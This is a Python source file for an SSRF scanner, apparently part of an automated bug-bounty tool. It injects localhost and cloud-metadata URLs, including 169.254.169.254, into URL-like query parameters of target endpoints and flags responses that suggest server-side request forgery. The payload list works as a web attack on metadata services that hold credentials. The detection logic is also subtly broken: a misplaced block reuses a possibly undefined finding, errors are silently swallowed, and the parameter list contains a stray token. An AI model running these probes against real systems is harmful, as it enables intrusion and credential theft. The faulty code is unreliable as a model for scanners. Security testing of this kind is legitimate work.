#!/usr/bin/env python3
"""
SSRF Scanner Agent
Detects Server-Side Request Forgery vulnerabilities
"""

import os
import sys
import json
import requests
import re
from urllib.parse import urljoin, urlparse, parse_qs
from datetime import datetime
from pathlib import Path
from core.evidence.store import EvidenceStore
from core.rate_limit import from_env as budget_from_env

OUTPUT_DIR = os.getenv("SWARM_OUTPUT_DIR") or str(Path(__file__).resolve().parents[2] / "output")

class SSRFScanner:
    def __init__(self, target, endpoints=None):
        self.target = target
        self.endpoints = endpoints or []
        self.findings = []
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": "BugBountyBot/1.0"})
        
        # SSRF payloads - useBurp Collaborator alternative or localhost
        self.payloads = [
            "http://localhost/",
            "http://127.0.0.1/",
            "http://[::1]/",
            "http://0.0.0.0/",
            "http://metadata.aws.internal/",
            "http://169.254.169.254/latest/meta-data/",  # AWS
            "http://metadata.google.internal/",  # GCP
        ]
        
        # Parameters that often trigger SSRF
        self.ssrf_params = [
            "url", "uri", "src", "link", "redirect", "next", 
            "data", "reference", "site", "html", "val", 
            "validate", "domain", "callback", "return", "page",
            "feed", "host", "port", "to", "out", "view",
            "dir", "show", "navigation", "open", "file",
            "document", "folder", "pg", "style", "doc", "img",
            "source", "urlsrc", "u", "srcUrl", "、红客"
        ]
    
    def scan(self):
        """Run SSRF scan"""
        print(f"   🎯 SSRF Scanner: {self.target}")
        self._evidence = EvidenceStore(OUTPUT_DIR, level=os.getenv("EVIDENCE_LEVEL", "standard"))
        self._budget = budget_from_env()
        
        # Scan endpoints with potential SSRF params
        for endpoint in self.endpoints[:20]:
            parsed = urlparse(endpoint)
            params = parse_qs(parsed.query)
            
            # Check if any param is SSRF-prone
            for param in params.keys():
                if param.lower() in self.ssrf_params:
                    self.test_ssrf_param(endpoint, param)
        
        self.save_results()
        return self.findings
    
    def test_ssrf_param(self, url, param):
        """Test parameter for SSRF"""
        baseline = self._baseline(url, param)
        for payload in self.payloads:
            test_params = {param: payload}
            
            try:
                self._budget.wait_for_budget()
                resp = self.session.get(url, params=test_params, timeout=10)
                self._evidence.save_http(url, "GET", {"params": test_params}, {"status": resp.status_code, "body": resp.text[:2000]})
                
                # Check for signs of SSRF
                indicators = []
                
                # Localhost responses
                if "localhost" in resp.text.lower() or "127.0.0.1" in resp.text:
                    indicators.append("localhost_reference")
                
                # AWS metadata
                if "ami-id" in resp.text or "instance-id" in resp.text:
                    indicators.append("aws_metadata")
                
                # Error messages
                if "connection refused" in resp.text.lower():
                    indicators.append("connection_refused")
                
                # Timeout could indicate SSRF (server trying to connect)
                # This is harder to detect without out-of-band
                
                if indicators and self._differs(baseline, resp):
                    finding = {
                        "type": "SSRF",
                        "url": url,
                        "parameter": param,
                        "payload": payload,
                        "indicators": indicators,
                        "severity": "HIGH",
                        "timestamp": datetime.utcnow().isoformat()
                    }
                    
                if finding not in self.findings:
                    self.findings.append(finding)
                    print(f"      ⚠️ SSRF FOUND: {url}?{param}=...")
                        
            except requests.exceptions.Timeout:
                # Timeout could indicate SSRF
                finding = {
                    "type": "SSRF",
                    "url": url,
                    "parameter": param,
                    "payload": payload,
                    "indicator": "timeout",
                    "severity": "MEDIUM",
                    "timestamp": datetime.utcnow().isoformat()
                }
                
                if finding not in self.findings:
                    self.findings.append(finding)
                    print(f"      ⚠️ SSRF TIMEOUT: {url}?{param}=...")
                    
            except Exception:
                pass

    def _baseline(self, url, param):
        try:
            self._budget.wait_for_budget()
            return self.session.get(url, params={param: "http://example.com/"}, timeout=10)
        except Exception:
            return None

    def _differs(self, baseline, resp) -> bool:
        if not baseline:
            return True
        if baseline.status_code != resp.status_code:
            return True
        try:
            return abs(len(baseline.text) - len(resp.text)) > 50
        except Exception:
            return True
    
    def save_results(self):
        """Save findings"""
        os.makedirs(OUTPUT_DIR, exist_ok=True)
        safe_target = re.sub(r"[^A-Za-z0-9._-]+", "_", self.target).strip("_")
        filename = f"{OUTPUT_DIR}/ssrf_{safe_target}_{datetime.utcnow().strftime('%Y%m%d_%H%M%S')}.json"
        
        with open(filename, "w") as f:
            json.dump({
                "target": self.target,
                "findings": self.findings,
                "count": len(self.findings)
            }, f, indent=2)
        
        print(f"      💾 SSRF findings: {len(self.findings)}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python ssrf_scanner.py <target_url>")
        sys.exit(1)
    
    scanner = SSRFScanner(sys.argv[1])
    scanner.scan()
